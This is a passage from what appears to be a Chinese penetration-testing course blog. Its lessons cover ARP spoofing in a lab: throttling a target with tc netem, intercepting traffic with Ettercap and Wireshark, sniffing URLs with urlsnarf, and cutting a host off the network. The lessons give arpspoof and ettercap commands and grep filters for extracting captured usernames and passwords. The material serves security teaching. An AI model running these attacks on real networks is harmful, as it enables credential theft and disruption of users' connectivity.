href="#2-取消限制网速200ms延时" class="headerlink" title="2.取消限制网速200ms延时"></a>2.取消限制网速200ms延时</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc del dev eth0 root netem delay 200ms参数：qdisc：排队规则del:删除dev：设备（网卡）root：root用户身份netem delay：设置网络延时时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-修改网络延时"><a href="#3-修改网络延时" class="headerlink" title="3.修改网络延时"></a>3.修改网络延时</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc change&nbsp; dev eth0 root netem delay 300ms参数：qdisc：排队规则change:修改dev：设备（网卡）root：root用户身份netem delay：设置网络延时时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ARP攻击限制网速的具体步骤"><a href="#3-ARP攻击限制网速的具体步骤" class="headerlink" title="3.ARP攻击限制网速的具体步骤"></a>3.ARP攻击限制网速的具体步骤</h2><h4 id="1-开启端口转发"><a href="#1-开启端口转发" class="headerlink" title="1.开启端口转发"></a>1.开启端口转发</h4><pre class="line-numbers language-none"><code class="language-none">cat /proc/sys/net/ipv4/ip_forward         #值为0表示没开启流量转发，为1表示开启了echo 1 &gt; /proc/sys/net/ipv4/ip_forward     #开启流量转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-开启ARP攻击"><a href="#2-开启ARP攻击" class="headerlink" title="2.开启ARP攻击"></a>2.开启ARP攻击</h4><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-查看靶机当前的网速"><a href="#3-查看靶机当前的网速" class="headerlink" title="3.查看靶机当前的网速"></a>3.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-开启网络延迟限速"><a href="#4-开启网络延迟限速" class="headerlink" title="4.开启网络延迟限速"></a>4.开启网络延迟限速</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc add dev eth0 root netem delay 500ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-查看限速规则"><a href="#5-查看限速规则" class="headerlink" title="5.查看限速规则"></a>5.查看限速规则</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-查看靶机当前的网速"><a href="#6-查看靶机当前的网速" class="headerlink" title="6.查看靶机当前的网速"></a>6.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-修改网速限制"><a href="#7-修改网速限制" class="headerlink" title="7.修改网速限制"></a>7.修改网速限制</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc change dev eth0 root netem delay 800ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-查看限速规则"><a href="#8-查看限速规则" class="headerlink" title="8.查看限速规则"></a>8.查看限速规则</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-查看靶机当前的网速"><a href="#9-查看靶机当前的网速" class="headerlink" title="9.查看靶机当前的网速"></a>9.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-取消限速"><a href="#10-取消限速" class="headerlink" title="10.取消限速"></a>10.取消限速</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc del dev eth0 root netem delay 800ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="11-查看限速规则"><a href="#11-查看限速规则" class="headerlink" title="11.查看限速规则"></a>11.查看限速规则</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="12-查看靶机当前的网速"><a href="#12-查看靶机当前的网速" class="headerlink" title="12.查看靶机当前的网速"></a>12.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-限速原理讲解"><a href="#4-限速原理讲解" class="headerlink" title="4.限速原理讲解"></a>4.限速原理讲解</h2><p><img src="assets/ARP%E9%99%90%E5%88%B6%E7%BD%91%E9%80%9F%E5%8E%9F%E7%90%86%E5%9B%BE.png" alt="ARP限制网速原理图"></p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>请参考：ARP限制网速攻击-课后笔记.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.ARP-Ettercap劫持用户流量</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/5.arp-ettercap-jie-chi-yong-hu-liu-liang/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/5.arp-ettercap-jie-chi-yong-hu-liu-liang/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP-Ettercap劫持用户流量"><a href="#ARP-Ettercap劫持用户流量" class="headerlink" title="ARP-Ettercap劫持用户流量"></a>ARP-Ettercap劫持用户流量</h1><h2 id="一-ettercap-工具介绍"><a href="#一-ettercap-工具介绍" class="headerlink" title="一.ettercap 工具介绍"></a>一.ettercap 工具介绍</h2><p>项目官网：<a href="http://ettercap.github.io/ettercap/index.html">http://ettercap.github.io/ettercap/index.html</a></p><p>EtterCap是一个基于ARP地址欺骗方式的网络嗅探工具，主要适用于交换局域网络。借助于EtterCap嗅探软件，渗透测试人员可以检测网络内<strong>明文</strong>数据通讯的安全性，及时采取措施，避免敏感的用户名/密码等数据以明文的方式进行传输。</p><p>ettercap几乎是每个渗透测试人员必备的工具之一。</p><h2 id="二-ARP截获用户信息攻击步骤"><a href="#二-ARP截获用户信息攻击步骤" class="headerlink" title="二.ARP截获用户信息攻击步骤"></a>二.ARP截获用户信息攻击步骤</h2><h4 id="1-启动ettercap"><a href="#1-启动ettercap" class="headerlink" title="1.启动ettercap"></a>1.启动ettercap</h4><pre class="line-numbers language-none"><code class="language-none">ettercap -G<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-点击右上角的对勾开始扫描"><a href="#2-点击右上角的对勾开始扫描" class="headerlink" title="2.点击右上角的对勾开始扫描"></a><strong>2.点击右上角的对勾开始扫描</strong></h4><p><img src=".%5Cassets%5C%E5%BC%80%E5%90%AF%E6%89%AB%E6%8F%8F.png" alt="开启扫描"></p><h4 id="3-点击左上角查看主机列表"><a href="#3-点击左上角查看主机列表" class="headerlink" title="3.点击左上角查看主机列表"></a><strong>3.点击左上角查看主机列表</strong></h4><p><img src=".%5Cassets%5C%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8.png" alt="查看主机列表"></p><h4 id="4-选择网关-点击底部的-Add-to-Target-1"><a href="#4-选择网关-点击底部的-Add-to-Target-1" class="headerlink" title="4.选择网关 点击底部的 Add to Target 1"></a><strong>4.选择网关 点击底部的 Add to Target 1</strong></h4><p><img src=".%5Cassets%5C%E5%B0%86%E7%BD%91%E5%85%B3%E5%8A%A0%E5%85%A5%E7%9B%AE%E6%A0%871.png" alt="将网关加入目标1"></p><h4 id="5-选择攻击靶机加入到target2"><a href="#5-选择攻击靶机加入到target2" class="headerlink" title="5.选择攻击靶机加入到target2"></a><strong>5.选择攻击靶机加入到target2</strong></h4><p><img src=".%5Cassets%5C%E5%B0%86%E9%9D%B6%E6%9C%BA%E5%8A%A0%E5%85%A5%E5%88%B0%E7%9B%AE%E6%A0%872.png" alt="将靶机加入到目标2"></p><h4 id="6-点击右上角攻击菜单，选择ARP攻击"><a href="#6-点击右上角攻击菜单，选择ARP攻击" class="headerlink" title="6.点击右上角攻击菜单，选择ARP攻击"></a><strong>6.点击右上角攻击菜单，选择ARP攻击</strong></h4><p><img src=".%5Cassets%5C%E9%80%89%E6%8B%A9ARP%E6%94%BB%E5%87%BB.png" alt="选择ARP攻击"></p><h4 id="7-点击ok发起攻击"><a href="#7-点击ok发起攻击" class="headerlink" title="7.点击ok发起攻击"></a><strong>7.点击ok发起攻击</strong></h4><p><img src=".%5Cassets%5C%E7%82%B9%E5%87%BBok%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB.png" alt="点击ok发起攻击"></p><h4 id="8-查看此时靶机的arp列表"><a href="#8-查看此时靶机的arp列表" class="headerlink" title="8.查看此时靶机的arp列表"></a>8.查看此时靶机的arp列表</h4><pre class="line-numbers language-none"><code class="language-none">arp -a|findstr 192.168.110.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-查看kali的mac地址"><a href="#9-查看kali的mac地址" class="headerlink" title="9.查看kali的mac地址"></a>9.查看kali的mac地址</h4><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-靶机登录网站"><a href="#10-靶机登录网站" class="headerlink" title="10.靶机登录网站"></a><strong>10.靶机登录网站</strong></h4><pre class="line-numbers language-none"><code class="language-none">http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2Fhttp://vmims.eguagua.cn/#/Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="11-截获用户流量，获取账号密码"><a href="#11-截获用户流量，获取账号密码" class="headerlink" title="11.截获用户流量，获取账号密码"></a><strong>11.截获用户流量，获取账号密码</strong></h4><p><img src=".%5Cassets%5C%E6%88%AA%E8%8E%B7%E7%94%A8%E6%88%B7%E6%B5%81%E9%87%8F%E4%BF%A1%E6%81%AF.png" alt="截获用户流量信息"></p><h4 id="12-停止攻击"><a href="#12-停止攻击" class="headerlink" title="12.停止攻击"></a><strong>12.停止攻击</strong></h4><p><img src=".%5Cassets%5C%E5%81%9C%E6%AD%A2%E6%94%BB%E5%87%BB.png" alt="停止攻击"></p><h2 id="三-Ettercap-软件功能介绍"><a href="#三-Ettercap-软件功能介绍" class="headerlink" title="三.Ettercap 软件功能介绍"></a>三.Ettercap 软件功能介绍</h2><h4 id="1-启动界面"><a href="#1-启动界面" class="headerlink" title="1.启动界面"></a><strong>1.启动界面</strong></h4><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A21.png" alt="界面1"></p><ul><li><p>Sniffing at startup :开启嗅探模式</p></li><li><p>Primary interface :选择网卡</p></li><li><p>Bridged sniffing :是否开启<strong>桥接</strong>模式</p></li><li><p>Bridged interface :桥接模式下的网卡</p></li></ul><p>配置完成后，我们点上方的✔即可完成配置。</p><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A22.png" alt="界面2"></p><h4 id="2-中间人攻击菜单"><a href="#2-中间人攻击菜单" class="headerlink" title="2.中间人攻击菜单"></a><strong>2.中间人攻击菜单</strong></h4><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A23.png" alt="界面3"></p><ul><li><p>ARP poisoning :<strong>ARP攻击</strong></p></li><li><p>DNP poisoning :DNP攻击</p></li><li><p>ICMP redirect :icmp重定向</p></li><li><p>Port stealing :端口欺骗</p></li><li><p>DHCP spoofing :DHCP欺骗</p></li><li><p>stop MITM :停止攻击</p></li><li><p>SSL intercept :ssl嗅探</p></li></ul><h4 id="3-更多选项"><a href="#3-更多选项" class="headerlink" title="3.更多选项"></a><strong>3.更多选项</strong></h4><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A24.png" alt="界面4"></p><ul><li><p>Targets:<strong>攻击列表</strong></p></li><li><p>Hosts：显示主机列表</p></li><li><p>Filters：载入二进制脚本</p></li><li><p>Plugins：插件</p></li><li><p>Logging:日志</p></li></ul><h4 id="4-hosts选项"><a href="#4-hosts选项" class="headerlink" title="4.hosts选项"></a><strong>4.hosts选项</strong></h4><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A25.png" alt="界面5"></p><ul><li><p>Hosts list：扫描到的主机列表</p></li><li><p>Enable ipv6 scan：扫描ipv6地址</p></li><li><p>Scan for hosts：扫描主机列表</p></li><li><p>load hosts form file：从外部文件载入主机列表</p></li><li><p>Save hosts to file：保存主机列表到文件</p></li></ul><h4 id="5-Targets选项"><a href="#5-Targets选项" class="headerlink" title="5.Targets选项"></a><strong>5.Targets选项</strong></h4><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A26.png" alt="界面6"></p><ul><li><p>Current targets：<strong>正在攻击的列表</strong></p></li><li><p>Select targets:：选择攻击列表</p></li><li><p>Portocol：攻击协议</p></li><li><p>Reverse matching：匹配规则</p></li><li><p>Wipe targets：擦除攻击</p></li></ul><h4 id="6-View选项"><a href="#6-View选项" class="headerlink" title="6.View选项"></a><strong>6.View选项</strong></h4><p><img src=".%5Cassets%5C%E7%95%8C%E9%9D%A27.png" alt="界面7"></p><ul><li><p>Connections：连接信息</p></li><li><p>Profiles：IP地址信息</p></li><li><p>Statistics：统计信息</p></li></ul><h2 id="四-命令行运行Ettercap"><a href="#四-命令行运行Ettercap" class="headerlink" title="四.命令行运行Ettercap"></a>四.命令行运行Ettercap</h2><h4 id="1-运行命令讲解"><a href="#1-运行命令讲解" class="headerlink" title="1.运行命令讲解"></a><strong>1.运行命令讲解</strong></h4><pre class="line-numbers language-none"><code class="language-none">ettercap –i –eth0 –Tq –M arp:remote/ip(host)//net gatemask/ &gt;&gt;b.txtT：指的是text文本模式q：指的是安静模式执行这个命令i：后面跟的是连接局域网的网卡M：后面跟的是指定使用arp的方式&gt;&gt;：输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-攻击命令"><a href="#2-攻击命令" class="headerlink" title="2.攻击命令"></a><strong>2.攻击命令</strong></h4><pre class="line-numbers language-none"><code class="language-none">ettercap -T -i eth0  -M arp:remote /192.168.70.1// /192.168.70.130// ettercap -Tq -l a.log -i eth0  -M arp:remote /192.168.70.1// /192.168.70.130// ettercap -Tq -i eth0  -M arp:remote /192.168.70.1// /192.168.70.130// &gt;&gt;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-靶机登录后台网站"><a href="#3-靶机登录后台网站" class="headerlink" title="3.靶机登录后台网站"></a><strong>3.靶机登录后台网站</strong></h4><pre class="line-numbers language-none"><code class="language-none">http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2Fhttp://vmims.eguagua.cn/#/Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-查看攻击界面日志"><a href="#4-查看攻击界面日志" class="headerlink" title="4.查看攻击界面日志"></a><strong>4.查看攻击界面日志</strong></h4><pre class="line-numbers language-none"><code class="language-none">tail -f b.txt停止查看：CTRL+C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-过滤无用信息，只查看用户的登录信息"><a href="#5-过滤无用信息，只查看用户的登录信息" class="headerlink" title="5.过滤无用信息，只查看用户的登录信息"></a><strong>5.过滤无用信息，只查看用户的登录信息</strong></h4><pre class="line-numbers language-none"><code class="language-none">tail -f b.txt | grep "USER" 或者tail -f b.txt | grep "CONTENT" 或者tail -f b.txt | egrep "USER|CONTENT"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-停止ARP攻击"><a href="#6-停止ARP攻击" class="headerlink" title="6.停止ARP攻击"></a><strong>6.停止ARP攻击</strong></h4><pre class="line-numbers language-none"><code class="language-none">CTRL+C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-分析日志"><a href="#7-分析日志" class="headerlink" title="7.分析日志"></a><strong>7.分析日志</strong></h4><pre class="line-numbers language-none"><code class="language-none">cat b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-筛选用户的登录信息"><a href="#8-筛选用户的登录信息" class="headerlink" title="8.筛选用户的登录信息"></a><strong>8.筛选用户的登录信息</strong></h4><pre class="line-numbers language-none"><code class="language-none">cat b.txt | grep "USER" 或者cat b.txt | grep "CONTENT" 或者cat b.txt | egrep "USER|CONTENT"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-收集保存用户信息文件"><a href="#9-收集保存用户信息文件" class="headerlink" title="9.收集保存用户信息文件"></a>9.收集保存用户信息文件</h4><pre class="line-numbers language-none"><code class="language-none">cat -n  b.txt | egrep "USER|CONTENT" &gt;arp.log-n:添加行号egrep：过滤规则&gt;:输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五：课堂小结"><a href="#五：课堂小结" class="headerlink" title="五：课堂小结"></a>五：课堂小结</h2><p>请查看：ARP-Ettercap劫持用户流量.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4.ARP-WireShark截获用户数据</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/4.arp-wireshark-jie-huo-yong-hu-shu-ju/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/4.arp-wireshark-jie-huo-yong-hu-shu-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP-WireShark截获用户数据"><a href="#ARP-WireShark截获用户数据" class="headerlink" title="ARP-WireShark截获用户数据"></a>ARP-WireShark截获用户数据</h1><h2 id="1-WireShark工具介绍"><a href="#1-WireShark工具介绍" class="headerlink" title="1.WireShark工具介绍"></a>1.WireShark工具介绍</h2><p>wireshark的官方下载网站： <a href="http://www.wireshark.org/">http://www.wireshark.org/</a></p><p>wireshark是非常流行的网络封包分析软件，功能十分强大。可以截取各种网络封包，显示网络封包的详细信息。</p><p>wireshark是开源软件，可以放心使用。 可以运行在Windows，linux和Mac OS上。</p><h2 id="2-ARP攻击截获密码的步骤"><a href="#2-ARP攻击截获密码的步骤" class="headerlink" title="2.ARP攻击截获密码的步骤"></a>2.ARP攻击截获密码的步骤</h2><p><strong>1.开启数据包转发</strong></p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.开启ARP攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3.启动wireshark</strong></p><pre class="line-numbers language-none"><code class="language-none">wireshark<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4.输入过滤条件</strong></p><pre class="line-numbers language-none"><code class="language-none">(ip.src==192.168.110.11 or ip.dst==192.168.110.11) and tcp.port==80 and http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>5.靶机登录后台系统</strong></p><pre class="line-numbers language-none"><code class="language-none">http://mng.517628.com/login.phphttp://vmims.eguagua.cn/#/Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>6.wireshark寻找用户的登录信息</strong></p><p><img src="assets/%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D.png" alt="获取用户名"></p><p><img src="assets/%E5%88%86%E6%9E%90%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png" alt="分析用户名和密码"></p><h2 id="3-WireSahrk-过滤命令讲解"><a href="#3-WireSahrk-过滤命令讲解" class="headerlink" title="3.WireSahrk 过滤命令讲解"></a>3.WireSahrk 过滤命令讲解</h2><p><strong>1.过滤源ip，目的ip</strong></p><p>​在wireshark的过滤规则框Filter中输入过滤条件。</p><p>​如查找目的地址为192.168.110.11的包</p><pre class="line-numbers language-none"><code class="language-none">ip.dst==192.168.110.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​查找源地址为1.1.1.1的包</p><pre class="line-numbers language-none"><code class="language-none">ip.src==1.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.端口过滤</strong></p><p>2.1把源端口和目的端口为80的都过滤出来</p><pre class="line-numbers language-none"><code class="language-none">tcp.port==80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.2只过滤目的端口为80的</p><pre class="line-numbers language-none"><code class="language-none">tcp.dstport==80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.3只过滤源端口为80的包</p><pre class="line-numbers language-none"><code class="language-none">tcp.srcport==80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3.协议过滤</strong></p><p>直接在Filter框中直接输入协议名即可滤</p><pre class="line-numbers language-none"><code class="language-none">httptcpssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>4.http模式过滤</strong></p><p>4.1过滤get包</p><pre class="line-numbers language-none"><code class="language-none">http.request.method=="GET"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.2过滤post包</p><pre class="line-numbers language-none"><code class="language-none">http.request.method=="POST"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>5.过滤多种条件</strong></p><p>用and连接，如过滤ip为192.168.110.11并且为http协议的</p><pre class="line-numbers language-none"><code class="language-none">ip.src==192.168.110.11 and http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-课堂小结"><a href="#4-课堂小结" class="headerlink" title="4.课堂小结"></a>4.课堂小结</h2><p>请看ARP-WireShark获取用户信息.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.ARP攻击-流量分析</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/3.arp-liu-liang-fen-xi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/3.arp-liu-liang-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP攻击-流量分析"><a href="#ARP攻击-流量分析" class="headerlink" title="ARP攻击-流量分析"></a>ARP攻击-流量分析</h1><h2 id="1-课前准备"><a href="#1-课前准备" class="headerlink" title="1.课前准备"></a>1.课前准备</h2><p>1.kali作为攻击机</p><p>2.win10作为靶机</p><h2 id="2-kali数据包转发"><a href="#2-kali数据包转发" class="headerlink" title="2.kali数据包转发"></a>2.kali数据包转发</h2><p>出于安全考虑，Linux系统默认是禁止数据包转发的。所谓<strong>转发</strong>即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的ip地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。</p><p><strong>1.如何开启通信转发？</strong></p><p>kali里有个<strong>ip_forward</strong> 配置文件 </p><ol><li>默认是0 禁止端口转发</li><li>将其设置成1 开启端口转发</li></ol><p><strong>2.开启步骤</strong></p><p>1.查看当前是否开启了端口转发</p><pre class="line-numbers language-none"><code class="language-none">cat /proc/sys/net/ipv4/ip_forward&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.开启通信转发的命令</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.使用arpspoof发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.2 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.win10验证是否转发成功</p><pre class="line-numbers language-none"><code class="language-none">访问：https://www.mashibing.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-dsniff工具"><a href="#3-dsniff工具" class="headerlink" title="3.dsniff工具"></a>3.dsniff工具</h2><p><strong>1.工具介绍</strong></p><p>Dsniff是一个基于unix系统网络嗅探工具，工具集包含两个我们需要的两个工具包，<strong>arpspoof</strong> 和<strong>urlsnarf</strong>。              </p><p><strong>2.安装方法</strong></p><pre class="line-numbers language-none"><code class="language-none">apt-get install dsniff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.urlsnarf工具介绍</p><pre class="line-numbers language-none"><code class="language-none">urlsnarf -hurlsnarf [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]-n 表示不反查主机名-i interface 网卡接口名-p pattern 表示对过滤的内容使用的正则表达式-v表示取相反，即是不匹配；expression 是过滤语法，和tcpdump的相同，请参考tcpdump。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-url流量分析"><a href="#4-url流量分析" class="headerlink" title="4.url流量分析"></a>4.url流量分析</h2><p><strong>1.概念</strong></p><p>URL流量嗅探操作非常<strong>类似于中间人攻击</strong>，通过目标主机将路由流量注入到因特网。该过程将通过ARP注入实现攻击。url嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获得你上网信息。</p><p><strong>2.攻击流程</strong></p><p>1.开启流量转发</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.开启ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.2 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.捕获目标计算机的url</p><pre class="line-numbers language-none"><code class="language-none">urlsnarf -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.靶机上网，访问网站</p><pre class="line-numbers language-none"><code class="language-none">1.http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2F2.http://blog.tianya.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.kali分析用户请求</p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>请看ARP流量分析课后笔记.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2.ARP断网攻击</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/2.arp-duan-wang-gong-ji/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/2.arp-duan-wang-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h1><h2 id="1-课前准备"><a href="#1-课前准备" class="headerlink" title="1.课前准备"></a>1.课前准备</h2><p>kali 作为ARP攻击机，192.168.70.3  MAC地址：00:0c:29:5f:7e:d4</p><p>win10 作为被攻击方，192.168.70.130   MAC地址：00:0c:29:8e:da:0f </p><p>网关（路由器），192.168.70.2    MAC地址：00:50:56:f3:07:7c</p><p>需要注意的时，两台主机需要在同一个局域网，并且网络通畅。</p><pre class="line-numbers language-none"><code class="language-none">ping www.mashibing.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>计算上网的过程示意图：</p><p><img src="assets/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8A%E7%BD%91%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="计算机上网示意图"></p><h2 id="2-arp断网攻击原理"><a href="#2-arp断网攻击原理" class="headerlink" title="2.arp断网攻击原理"></a>2.arp断网攻击原理</h2><p>他的原理是：向目标主机不断的发送<strong>ARP报文</strong>，然后将其报文中的<strong>网关Mac地址</strong>设置成为<strong>攻击机的主机MAC地址</strong>，<br>然后目标主机想要访问网络发送数据包时，都会发送到攻击机，然后攻击机只需要<strong>做一个丢弃数据包的</strong><br><strong>命令</strong>，就可以断掉目标主机的网络了。</p><h2 id="3-arpspoof介绍"><a href="#3-arpspoof介绍" class="headerlink" title="3.arpspoof介绍:"></a>3.arpspoof介绍:</h2><p>arpspoof [spuːf]  是一个好用的ARP欺骗工具，攻击者通<strong>过毒化受害者ARP缓存</strong>，将网关MAC替换为攻击者MAC，然后攻击者可截获受害者发送和收到的数据包，从而获取受害者账户、密码等相关敏感信息。Kali linux中自带了该工具。</p><p>命令使用讲解</p><pre class="line-numbers language-none"><code class="language-none">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host-i：指定网卡-c:攻击机的IP-t 目标机器的IP-r：网关IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-具体攻击步骤："><a href="#4-具体攻击步骤：" class="headerlink" title="4.具体攻击步骤："></a>4.具体攻击步骤：</h2><p><strong>1.首先确保两台机器在同一局域网络下，并且可以互相通讯。</strong></p><p>​1.1查看kali的ip：</p><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​1.2 查看windows的ip：</p><pre class="line-numbers language-none"><code class="language-none">ipconfig /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​1.3 windows ping kali:</p><pre class="line-numbers language-none"><code 